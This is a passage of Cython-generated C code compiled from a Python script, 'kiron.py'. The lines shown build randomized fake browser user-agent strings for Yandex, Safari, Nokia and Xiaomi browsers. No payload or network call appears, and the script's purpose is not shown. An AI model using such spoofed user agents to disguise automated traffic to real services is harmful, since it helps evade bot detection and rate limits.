  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_1};
    __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 346, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_v_mobile = __pyx_t_2;
  __pyx_t_2 = 0;

  /* "kiron.py":347
 *      br_virshon = f"{str(random.randrange(11,99))}.1.0.{str(random.randrange(111,999))}.00"
 *      mobile = random.choice(moe)
 *      cudiua1 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+kkkkki+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) "+chorom+" YaBrowser/"+br_virshon+" SA/{str(rr(1,9))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"             # <<<<<<<<<<<<<<
 *      cudiua2 = f"Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(11,19))}.{str(rr(11,59))} (KHTML, like Gecko) Version/{chorom} Safari/{str(rr(1111,7999))}.25.{str(rr(17,89))}"
 *      cudiua3 = f"NokiaX{str(rr(1,9))}-0{str(rr(1,9))}/{str(rr(1,9))}.{str(rr(1,9))} ({str(rr(1,9))}Profile/MIDP-2.1 Configuration/CLDC-1.1UNTRUSTED/2.0"
 */
  __pyx_t_2 = PyNumber_Add(__pyx_kp_u_Mozilla_5_0_Linux_arm_64_Android, __pyx_v_kkkkki); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = PyTuple_New(3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_Build);
  __pyx_t_6 += 7;
  __Pyx_GIVEREF(__pyx_kp_u_Build);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_Build);
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_v_bbbb); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G);
  __pyx_t_6 += 41;
  __Pyx_GIVEREF(__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G);
  PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u_AppleWebKit_537_36_KHTML_like_G);
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_3, 3, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyNumber_Add(__pyx_t_3, __pyx_v_chorom); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_4, __pyx_kp_s_YaBrowser); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyNumber_Add(__pyx_t_3, __pyx_v_br_virshon); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_4, __pyx_kp_s_SA_str_rr_1_9_Mobile_Safari_str); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_cudiua1 = __pyx_t_3;
  __pyx_t_3 = 0;

  /* "kiron.py":348
 *      mobile = random.choice(moe)
 *      cudiua1 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+kkkkki+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) "+chorom+" YaBrowser/"+br_virshon+" SA/{str(rr(1,9))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      cudiua2 = f"Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(11,19))}.{str(rr(11,59))} (KHTML, like Gecko) Version/{chorom} Safari/{str(rr(1111,7999))}.25.{str(rr(17,89))}"             # <<<<<<<<<<<<<<
 *      cudiua3 = f"NokiaX{str(rr(1,9))}-0{str(rr(1,9))}/{str(rr(1,9))}.{str(rr(1,9))} ({str(rr(1,9))}Profile/MIDP-2.1 Configuration/CLDC-1.1UNTRUSTED/2.0"
 *      cudiua4 = f"Mozilla/5.0 (Linux; U; Android 10; en-us; "+mmp+" Build/"+bbbb+") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+chorom+f" Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.{str(rr(11111,66666))} swan-mibrowser"
 */
  __pyx_t_3 = PyTuple_New(12); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_Mozilla_5_0_Macintosh_Intel_Mac);
  __pyx_t_6 += 59;
  __Pyx_GIVEREF(__pyx_kp_u_Mozilla_5_0_Macintosh_Intel_Mac);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_Mozilla_5_0_Macintosh_Intel_Mac);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_rr); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__40, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__11);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__11);
  PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u__11);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_rr); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__43, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u__11);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__11);
  PyTuple_SET_ITEM(__pyx_t_3, 4, __pyx_kp_u__11);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_rr); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__44, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_3, 5, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u_KHTML_like_Gecko_Version);
  __pyx_t_6 += 29;
  __Pyx_GIVEREF(__pyx_kp_u_KHTML_like_Gecko_Version);
  PyTuple_SET_ITEM(__pyx_t_3, 6, __pyx_kp_u_KHTML_like_Gecko_Version);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_v_chorom, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_3, 7, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u_Safari);
  __pyx_t_6 += 8;
  __Pyx_GIVEREF(__pyx_kp_u_Safari);
  PyTuple_SET_ITEM(__pyx_t_3, 8, __pyx_kp_u_Safari);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_rr); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__45, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_3, 9, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_25);
  __pyx_t_6 += 4;
  __Pyx_GIVEREF(__pyx_kp_u_25);
  PyTuple_SET_ITEM(__pyx_t_3, 10, __pyx_kp_u_25);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_rr); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__46, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_3, 11, __pyx_t_2);
  __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_3, 12, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_cudiua2 = ((PyObject*)__pyx_t_2);
  __pyx_t_2 = 0;

  /* "kiron.py":349
 *      cudiua1 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+kkkkki+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) "+chorom+" YaBrowser/"+br_virshon+" SA/{str(rr(1,9))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      cudiua2 = f"Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(11,19))}.{str(rr(11,59))} (KHTML, like Gecko) Version/{chorom} Safari/{str(rr(1111,7999))}.25.{str(rr(17,89))}"
 *      cudiua3 = f"NokiaX{str(rr(1,9))}-0{str(rr(1,9))}/{str(rr(1,9))}.{str(rr(1,9))} ({str(rr(1,9))}Profile/MIDP-2.1 Configuration/CLDC-1.1UNTRUSTED/2.0"             # <<<<<<<<<<<<<<
 *      cudiua4 = f"Mozilla/5.0 (Linux; U; Android 10; en-us; "+mmp+" Build/"+bbbb+") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+chorom+f" Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.{str(rr(11111,66666))} swan-mibrowser"
 *      cudiua5 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+str(mobile)+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" YaApp_Android/{str(rr(111,999))}.10.1 YaSearchBrowser/{str(rr(11,44))}.{str(rr(11,44))}.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
 */
  __pyx_t_2 = PyTuple_New(11); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_n_u_NokiaX);
  __pyx_t_6 += 6;
  __Pyx_GIVEREF(__pyx_n_u_NokiaX);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_n_u_NokiaX);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_rr); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__47, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_0_3);
  __pyx_t_6 += 2;
  __Pyx_GIVEREF(__pyx_kp_u_0_3);
  PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_0_3);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_rr); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__47, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 3, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__38);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__38);
  PyTuple_SET_ITEM(__pyx_t_2, 4, __pyx_kp_u__38);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_rr); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__47, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_2, 5, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u__11);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__11);
  PyTuple_SET_ITEM(__pyx_t_2, 6, __pyx_kp_u__11);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_rr); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__47, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 7, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__48);
  __pyx_t_6 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__48);
  PyTuple_SET_ITEM(__pyx_t_2, 8, __pyx_kp_u__48);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_rr); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__47, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_2, 9, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_Profile_MIDP_2_1_Configuration_C);
  __pyx_t_6 += 52;
  __Pyx_GIVEREF(__pyx_kp_u_Profile_MIDP_2_1_Configuration_C);
  PyTuple_SET_ITEM(__pyx_t_2, 10, __pyx_kp_u_Profile_MIDP_2_1_Configuration_C);
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_2, 11, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_cudiua3 = ((PyObject*)__pyx_t_4);
  __pyx_t_4 = 0;

  /* "kiron.py":350
 *      cudiua2 = f"Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(11,19))}.{str(rr(11,59))} (KHTML, like Gecko) Version/{chorom} Safari/{str(rr(1111,7999))}.25.{str(rr(17,89))}"
 *      cudiua3 = f"NokiaX{str(rr(1,9))}-0{str(rr(1,9))}/{str(rr(1,9))}.{str(rr(1,9))} ({str(rr(1,9))}Profile/MIDP-2.1 Configuration/CLDC-1.1UNTRUSTED/2.0"
